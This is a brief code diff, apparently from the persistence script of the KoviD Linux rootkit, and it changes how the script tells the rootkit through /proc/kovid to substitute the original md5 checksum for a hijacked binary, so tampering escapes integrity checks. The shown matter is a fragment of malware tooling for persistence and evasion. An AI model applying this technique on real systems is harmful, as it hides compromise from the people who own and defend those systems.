@@ -84,7 +84,7 @@ function do_persist() {
     readelf -h "$target" || false
 
     # Save original target checksum
-    # This will be used later for KoviD -md5add
+    # This will be used later for KoviD -m
     chksum_orig="$(md5sum "$target"| cut -d " " -f1)"
 
     # After copying the hijacked binary, update
@@ -141,7 +141,7 @@ function do_persist() {
     chksum_fake="$(md5sum "$vf"| cut -d " " -f1)"
 
     # Add new checksum
-    echo "-md5add $chksum_fake $chksum_orig" >/proc/kovid
+    echo "-m $chksum_orig $chksum_fake" >/proc/kovid
     echo "Success $chksum_fake $chksum_orig"
 
     rm -f "$vf"
